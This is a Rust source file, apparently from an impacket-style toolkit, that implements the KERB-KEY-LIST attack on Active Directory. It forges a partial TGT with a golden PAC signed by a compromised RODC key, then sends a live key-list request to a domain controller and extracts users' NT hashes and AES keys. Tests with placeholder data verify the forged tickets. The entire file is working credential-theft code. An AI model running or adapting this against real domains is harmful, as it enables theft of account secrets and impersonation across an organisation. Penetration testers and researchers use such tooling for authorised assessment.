//! KERB-KEY-LIST attack engine for Active Directory Read-Only Domain Controllers (RODC) (MS-KILE).
//!
//! Implements credential extraction without DC code execution using an RODC account key:
//! 1. Generates partial TGT with forged PAC signed by RODC key (CVE-2021-42287 compliant).
//! 2. Requests TGS with `KERB-KEY-LIST-REQ` (PA-DATA 161).
//! 3. Extracts user keys (NT hash / AES) from `KERB-KEY-LIST-REP` (PA-DATA 162).

use std::time::Duration;
use impacket_core::der;
use impacket_core::CoreError;
use impacket_ndr::RpcSid;

use crate::pac::build_golden_pac;
use crate::tgs::{get_tgs_live, Krb5TgsReq};
use crate::KerberosEType;

/// Converts UNIX timestamp to Kerberos GeneralizedTime format `YYYYMMDDHHMMSSZ`.
fn unix_to_kerberos_time(unix_secs: i64) -> String {
    let secs = if unix_secs < 0 { 0 } else { unix_secs as u64 };
    let s = secs % 60;
    let m = (secs / 60) % 60;
    let h = (secs / 3600) % 24;
    let days = secs / 86400;

    let mut y = 1970i64;
    let mut d = days;
    loop {
        let leap = (y % 4 == 0 && y % 100 != 0) || (y % 400 == 0);
        let d_in_y = if leap { 366 } else { 365 };
        if d < d_in_y {
            break;
        }
        d -= d_in_y;
        y += 1;
    }

    let leap = (y % 4 == 0 && y % 100 != 0) || (y % 400 == 0);
    let month_days = [
        31,
        if leap { 29 } else { 28 },
        31, 30, 31, 30, 31, 31, 30, 31, 30, 31,
    ];
    let mut mo = 1;
    for &md in &month_days {
        if d < md {
            break;
        }
        d -= md;
        mo += 1;
    }
    let mday = d + 1;

    format!("{:04}{:02}{:02}{:02}{:02}{:02}Z", y, mo, mday, h, m, s)
}

fn generate_deterministic_bytes(seed: &[u8], len: usize) -> Vec<u8> {
    let mut out = Vec::with_capacity(len);
    let mut hash = impacket_crypto::sha256(seed);
    while out.len() < len {
        out.extend_from_slice(&hash);
        hash = impacket_crypto::sha256(&hash);
    }
    out.truncate(len);
    out
}

/// Builds a partial TGT with an embedded, signed PAC using an RODC krbtgt AES/RC4 key.
///
/// Per MS-KILE §3.3.5.6.4 and issue #1667:
/// - `kvno` is formatted as `rodc_no << 16`
/// - Ticket contains a signed PAC with `PAC_REQUESTOR_INFO` matching `domain_sid-user_rid` (required by CVE-2021-42287)
/// - Encrypted with `rodc_key` using Key Usage 2 (`KU_TICKET`)
pub fn create_partial_tgt(
    domain: &str,
    username: &str,
    user_rid: Option<u32>,
    domain_sid: Option<&str>,
    rodc_no: u32,
    rodc_key: &[u8],
    rodc_etype: i32,
    now_unix: i64,
) -> Result<(Vec<u8>, Vec<u8>), CoreError> {
    let realm = domain.to_uppercase();
    let rid = user_rid.unwrap_or(1000);
    let sid_str = domain_sid.unwrap_or("S-1-5-21-0-0-0");
    let dom_sid = RpcSid::parse(sid_str)
        .map_err(|e| CoreError::ProtocolError(format!("Invalid domain SID '{}': {}", sid_str, e)))?;

    // 1. Build and sign PAC using RODC key
    let mut pac = build_golden_pac(&realm, username, &dom_sid, rid, &[513], now_unix);
    pac.sign_pac(rodc_key, rodc_etype, rodc_key, rodc_etype)?;
    let pac_bytes = pac.build();

    // 2. Build AuthorizationData: AD-IF-RELEVANT (1) containing AD-WIN2K-PAC (128)
    let pac_auth_element = der::encode_sequence(&[
        der::encode_context_explicit(0, &der::encode_integer(128)),
        der::encode_context_explicit(1, &der::encode_octet_string(&pac_bytes)),
    ]);
    let if_relevant_seq = der::encode_sequence(&[pac_auth_element]);
    let if_relevant_auth = der::encode_sequence(&[
        der::encode_context_explicit(0, &der::encode_integer(1)),
        der::encode_context_explicit(1, &der::encode_octet_string(&if_relevant_seq)),
    ]);
    let authorization_data = der::encode_sequence(&[if_relevant_auth]);

    // 3. Generate session key
    let session_key_len = match rodc_etype {
        18 | 20 => 32,
        _ => 16,
    };
    let seed_data = [
        realm.as_bytes(),
        username.as_bytes(),
        rodc_key,
        &now_unix.to_le_bytes(),
    ]
    .concat();
    let session_key = generate_deterministic_bytes(&seed_data, session_key_len);

    // 4. Build EncTicketPart (Application 3)
    // Flags: forwardable (bit 1 = 0x40000000), renewable (bit 8 = 0x00800000), enc-pa-rep (bit 15 = 0x00010000) -> 0x40810000
    let flags_der = der::encode_bit_string_u32(0x4081_0000);
    let key_seq = der::encode_sequence(&[
        der::encode_context_explicit(0, &der::encode_integer(rodc_etype as i64)),
        der::encode_context_explicit(1, &der::encode_octet_string(&session_key)),
    ]);
    let crealm_der = der::encode_general_string(&realm);
    let cname_seq = der::encode_sequence(&[
        der::encode_context_explicit(0, &der::encode_integer(1)), // NT-PRINCIPAL
        der::encode_context_explicit(
            1,
            &der::encode_sequence(&[der::encode_general_string(username)]),
        ),
    ]);
    let transited_seq = der::encode_sequence(&[
        der::encode_context_explicit(0, &der::encode_integer(0)),
        der::encode_context_explicit(1, &der::encode_octet_string(&[])),
    ]);

    let duration_secs = 120 * 86400; // 120 days
    let authtime_der = der::encode_generalized_time(&unix_to_kerberos_time(now_unix));
    let starttime_der = der::encode_generalized_time(&unix_to_kerberos_time(now_unix));
    let endtime_der = der::encode_generalized_time(&unix_to_kerberos_time(now_unix + duration_secs));
    let renew_till_der =
        der::encode_generalized_time(&unix_to_kerberos_time(now_unix + duration_secs));

    let enc_ticket_part_seq = der::encode_sequence(&[
        der::encode_context_explicit(0, &flags_der),
        der::encode_context_explicit(1, &key_seq),
        der::encode_context_explicit(2, &crealm_der),
        der::encode_context_explicit(3, &cname_seq),
        der::encode_context_explicit(4, &transited_seq),
        der::encode_context_explicit(5, &authtime_der),
        der::encode_context_explicit(6, &starttime_der),
        der::encode_context_explicit(7, &endtime_der),
        der::encode_context_explicit(8, &renew_till_der),
        der::encode_context_explicit(10, &authorization_data),
    ]);
    let enc_ticket_part_app = der::encode_application(3, &enc_ticket_part_seq);

    // 5. Encrypt EncTicketPart using key usage 2 (KU_TICKET)
    let cipher = match rodc_etype {
        18 => {
            let k32: [u8; 32] = rodc_key.try_into().map_err(|_| {
                CoreError::ProtocolError("AES-256 RODC key must be 32 bytes".into())
            })?;
            let conf16 = [0x54u8; 16];
            crate::crypto::aes256_cts_hmac_sha1_96_encrypt(&k32, 2, &enc_ticket_part_app, &conf16)?
        }
        17 => {
            let k16: [u8; 16] = rodc_key.try_into().map_err(|_| {
                CoreError::ProtocolError("AES-128 RODC key must be 16 bytes".into())
            })?;
            let conf16 = [0x54u8; 16];
            crate::crypto::aes128_cts_hmac_sha1_96_encrypt(&k16, 2, &enc_ticket_part_app, &conf16)?
        }
        19 => {
            let k16: [u8; 16] = rodc_key.try_into().map_err(|_| {
                CoreError::ProtocolError("AES-128-SHA2 RODC key must be 16 bytes".into())
            })?;
            let conf16 = [0x54u8; 16];
            crate::crypto::aes128_cts_hmac_sha256_128_encrypt(&k16, 2, &enc_ticket_part_app, &conf16)?
        }
        20 => {
            let k32: [u8; 32] = rodc_key.try_into().map_err(|_| {
                CoreError::ProtocolError("AES-256-SHA2 RODC key must be 32 bytes".into())
            })?;
            let conf16 = [0x54u8; 16];
            crate::crypto::aes256_cts_hmac_sha384_192_encrypt(&k32, 2, &enc_ticket_part_app, &conf16)?
        }
        23 => {
            let k16: [u8; 16] = rodc_key.try_into().map_err(|_| {
                CoreError::ProtocolError("RC4 RODC key must be 16 bytes".into())
            })?;
            let conf8 = [0x54u8; 8];
            crate::crypto::rc4_hmac_encrypt(&k16, 2, &enc_ticket_part_app, &conf8)
        }
        _ => {
            return Err(CoreError::ProtocolError(format!(
                "Unsupported RODC key etype: {}",
                rodc_etype
            )));
        }
    };

    // 6. Build Ticket (Application 1)
    let kvno_val = (rodc_no as i64) << 16;
    let enc_part_seq = der::encode_sequence(&[
        der::encode_context_explicit(0, &der::encode_integer(rodc_etype as i64)),
        der::encode_context_explicit(1, &der::encode_integer(kvno_val)),
        der::encode_context_explicit(2, &der::encode_octet_string(&cipher)),
    ]);
    let sname_seq = der::encode_sequence(&[
        der::encode_context_explicit(0, &der::encode_integer(2)), // NT-SRV-INST
        der::encode_context_explicit(
            1,
            &der::encode_sequence(&[
                der::encode_general_string("krbtgt"),
                der::encode_general_string(&realm),
            ]),
        ),
    ]);
    let ticket_seq = der::encode_sequence(&[
        der::encode_context_explicit(0, &der::encode_integer(5)), // tkt-vno
        der::encode_context_explicit(1, &crealm_der),
        der::encode_context_explicit(2, &sname_seq),
        der::encode_context_explicit(3, &enc_part_seq),
    ]);
    let ticket_app = der::encode_application(1, &ticket_seq);

    Ok((ticket_app, session_key))
}

/// Helper to extract NT hash (etype 23) from dumped keys.
pub fn find_nthash(keys: &[(i32, Vec<u8>)]) -> Option<String> {
    for (etype, key) in keys {
        if *etype == 23 && key.len() == 16 {
            return Some(impacket_core::encode_hex(key));
        }
    }
    None
}

/// Executes a live KERB-KEY-LIST exchange against an Active Directory KDC.
pub fn dump_user_keylist_live(
    kdc_host: &str,
    kdc_port: u16,
    domain: &str,
    username: &str,
    user_rid: Option<u32>,
    domain_sid: Option<&str>,
    rodc_no: u32,
    rodc_key: &[u8],
    rodc_etype: i32,
    requested_etypes: &[i32],
    now_unix: i64,
    timeout: Duration,
) -> Result<Vec<(i32, Vec<u8>)>, CoreError> {
    let (partial_tgt, session_key) = create_partial_tgt(
        domain, username, user_rid, domain_sid, rodc_no, rodc_key, rodc_etype, now_unix,
    )?;

    let spn = format!("krbtgt/{}", domain.to_uppercase());
    let mut tgs_req = Krb5TgsReq::new(
        domain,
        username,
        &spn,
        &partial_tgt,
        &session_key,
        rodc_etype,
        &[
            KerberosEType::Aes256CtsHmacSha1_96,
            KerberosEType::Aes128CtsHmacSha1_96,
            KerberosEType::Rc4Hmac,
        ],
    );
    tgs_req.with_key_list(requested_etypes.to_vec());

    let tgs_rep = get_tgs_live(kdc_host, kdc_port, &tgs_req, now_unix, timeout)?;
    tgs_rep.extract_key_list(&session_key, rodc_etype)
}

#[cfg(test)]
mod tests {
    use super::*;
    use impacket_core::decode_hex;
    use crate::pac::{
        extract_pac_from_authorization_data, parse_ticket_enc_part, PAC_ATTRIBUTES_INFO,
        PAC_CLIENT_INFO_TYPE, PAC_LOGON_INFO, PAC_PRIVSVR_CHECKSUM, PAC_REQUESTOR_INFO,
        PAC_SERVER_CHECKSUM,
    };

    const RODC_KEY_HEX: &str = "abababababababababababababababababababababababababababababababab";
    const RODC_NO: u32 = 5;
    const DOMAIN: &str = "contoso.com";
    const DOMAIN_SID: &str = "S-1-5-21-1-2-3";
    const USER: &str = "victim";
    const USER_RID: u32 = 1103;

    fn decrypt_enc_ticket_part(ticket_der: &[u8], rodc_key: &[u8]) -> Vec<u8> {
        let (_etype, _kvno, cipher_bytes) = parse_ticket_enc_part(ticket_der).unwrap();
        let k32: [u8; 32] = rodc_key.try_into().unwrap();
        crate::crypto::aes256_cts_hmac_sha1_96_decrypt(&k32, 2, &cipher_bytes).unwrap()
    }

    #[test]
    fn test_kvno_encodes_rodc_number() {
        let rodc_key = decode_hex(RODC_KEY_HEX).unwrap();
        let (partial_tgt, _) = create_partial_tgt(
            DOMAIN,
            USER,
            Some(USER_RID),
            Some(DOMAIN_SID),
            RODC_NO,
            &rodc_key,
            18,
            1_700_000_000,
        )
        .unwrap();

        let (_etype, kvno, _cipher) = parse_ticket_enc_part(&partial_tgt).unwrap();
        assert_eq!(kvno, Some(RODC_NO << 16));
    }

    #[test]
    fn test_partial_tgt_embeds_win2k_pac() {
        let rodc_key = decode_hex(RODC_KEY_HEX).unwrap();
        let (partial_tgt, _) = create_partial_tgt(
            DOMAIN,
            USER,
            Some(USER_RID),
            Some(DOMAIN_SID),
            RODC_NO,
            &rodc_key,
            18,
            1_700_000_000,
        )
        .unwrap();

        let pt = decrypt_enc_ticket_part(&partial_tgt, &rodc_key);
        let (app_tag, enc_app_body, _) = der::decode_tlv(&pt).unwrap();
        assert_eq!(app_tag, 0x63); // [APPLICATION 3] EncTicketPart
        let (_, enc_body, _) = der::decode_tlv(enc_app_body).unwrap(); // SEQUENCE (0x30)

        let mut rem = enc_body;
        let mut auth_data_bytes = Vec::new();
        while !rem.is_empty() {
            let (tag, val, next) = der::decode_tlv(rem).unwrap();
            rem = next;
            if (tag & 0x1F) == 10 {
                // authorization-data [10]
                auth_data_bytes = val.to_vec();
            }
        }

        assert!(!auth_data_bytes.is_empty());
        let pac = extract_pac_from_authorization_data(&auth_data_bytes).unwrap();

        // Verify required buffers
        assert!(pac.get_buffer(PAC_LOGON_INFO).is_some());
        assert!(pac.get_buffer(PAC_CLIENT_INFO_TYPE).is_some());
        assert!(pac.get_buffer(PAC_ATTRIBUTES_INFO).is_some());
        assert!(pac.get_buffer(PAC_REQUESTOR_INFO).is_some());
        assert!(pac.get_buffer(PAC_SERVER_CHECKSUM).is_some());
        assert!(pac.get_buffer(PAC_PRIVSVR_CHECKSUM).is_some());

        // Verify client info name
        let client_info = pac.get_client_info().unwrap();
        assert_eq!(client_info.name, USER);

        // Verify requestor SID matches DOMAIN_SID-USER_RID
        let req_sid = pac.get_requestor_info().unwrap();
        let expected_sid_str = format!("{}-{}", DOMAIN_SID, USER_RID);
        let expected_sid = RpcSid::parse(&expected_sid_str).unwrap();
        assert_eq!(req_sid, expected_sid);

        // Verify PAC signature with RODC key
        let verify_res = pac.verify_pac(&rodc_key, 18, Some((&rodc_key, 18)));
        assert!(verify_res.is_ok(), "PAC verification with RODC key must succeed");
    }

    #[test]
    fn test_extract_key_list_rep_when_not_first() {
        use crate::tgs::Krb5TgsRep;

        let session_key = vec![0x11u8; 16]; // RC4 session key
        let nthash = decode_hex("cafebabecafebabecafebabecafebabe").unwrap();

        // 1. Build EncryptionKey for KERB-KEY-LIST-REP
        let enc_key_seq = der::encode_sequence(&[
            der::encode_context_explicit(0, &der::encode_integer(23)), // RC4-HMAC
            der::encode_context_explicit(1, &der::encode_octet_string(&nthash)),
        ]);
        let key_list_rep_val = der::encode_sequence(&[enc_key_seq]);

        // 2. Build PA-DATA list: [PA-SUPPORTED-ENCTYPES (165), KERB-KEY-LIST-REP (162)]
        let pa_supp = der::encode_sequence(&[
            der::encode_context_explicit(1, &der::encode_integer(165)),
            der::encode_context_explicit(2, &der::encode_octet_string(&[0x1f, 0x00, 0x00, 0x00])),
        ]);
        let pa_keylist = der::encode_sequence(&[
            der::encode_context_explicit(1, &der::encode_integer(162)),
            der::encode_context_explicit(2, &der::encode_octet_string(&key_list_rep_val)),
        ]);
        let pa_seq = der::encode_sequence(&[pa_supp, pa_keylist]);

        // 3. Build EncTGSRepPart
        let k_seq = der::encode_sequence(&[
            der::encode_context_explicit(0, &der::encode_integer(23)),
            der::encode_context_explicit(1, &der::encode_octet_string(&session_key)),
        ]);
        let enc_kdc_rep_seq = der::encode_sequence(&[
            der::encode_context_explicit(0, &k_seq),
            der::encode_context_explicit(12, &pa_seq), // encrypted-pa-data [12]
        ]);
        let enc_tgs_rep_part_app = der::encode_application(26, &enc_kdc_rep_seq);

        // Encrypt with session key (usage 8)
        let k16: [u8; 16] = session_key.as_slice().try_into().unwrap();
        let conf8 = [0x12u8; 8];
        let rep_cipher = crate::crypto::rc4_hmac_encrypt(&k16, 8, &enc_tgs_rep_part_app, &conf8);

        let tgs_rep = Krb5TgsRep {
            realm: DOMAIN.to_uppercase(),
            ticket_sname: vec!["krbtgt".into(), DOMAIN.to_uppercase()],
            ticket_realm: DOMAIN.to_uppercase(),
            ticket_raw: vec![],
            ticket_enc_etype: 23,
            ticket_enc_cipher: vec![],
            ticket_kvno: Some(2),
            rep_enc_etype: 23,
            rep_enc_cipher: rep_cipher,
        };

        let keys = tgs_rep.extract_key_list(&session_key, 23).unwrap();
        assert_eq!(keys.len(), 1);
        assert_eq!(keys[0].0, 23);
        assert_eq!(keys[0].1, nthash);

        let hash_str = find_nthash(&keys).unwrap();
        assert_eq!(hash_str, "cafebabecafebabecafebabecafebabe");
    }

    #[test]
    fn test_extract_key_list_rep_absent() {
        use crate::tgs::Krb5TgsRep;

        let session_key = vec![0x11u8; 16];
        let pa_supp = der::encode_sequence(&[
            der::encode_context_explicit(1, &der::encode_integer(165)),
            der::encode_context_explicit(2, &der::encode_octet_string(&[0x1f, 0x00, 0x00, 0x00])),
        ]);
        let pa_seq = der::encode_sequence(&[pa_supp]);

        let k_seq = der::encode_sequence(&[
            der::encode_context_explicit(0, &der::encode_integer(23)),
            der::encode_context_explicit(1, &der::encode_octet_string(&session_key)),
        ]);
        let enc_kdc_rep_seq = der::encode_sequence(&[
            der::encode_context_explicit(0, &k_seq),
            der::encode_context_explicit(12, &pa_seq),
        ]);
        let enc_tgs_rep_part_app = der::encode_application(26, &enc_kdc_rep_seq);

        let k16: [u8; 16] = session_key.as_slice().try_into().unwrap();
        let conf8 = [0x12u8; 8];
        let rep_cipher = crate::crypto::rc4_hmac_encrypt(&k16, 8, &enc_tgs_rep_part_app, &conf8);

        let tgs_rep = Krb5TgsRep {
            realm: DOMAIN.to_uppercase(),
            ticket_sname: vec!["krbtgt".into(), DOMAIN.to_uppercase()],
            ticket_realm: DOMAIN.to_uppercase(),
            ticket_raw: vec![],
            ticket_enc_etype: 23,
            ticket_enc_cipher: vec![],
            ticket_kvno: Some(2),
            rep_enc_etype: 23,
            rep_enc_cipher: rep_cipher,
        };

        let res = tgs_rep.extract_key_list(&session_key, 23);
        assert!(res.is_err());
        let err_msg = res.unwrap_err().to_string();
        assert!(err_msg.contains("KERB-KEY-LIST-REP"));
    }
}
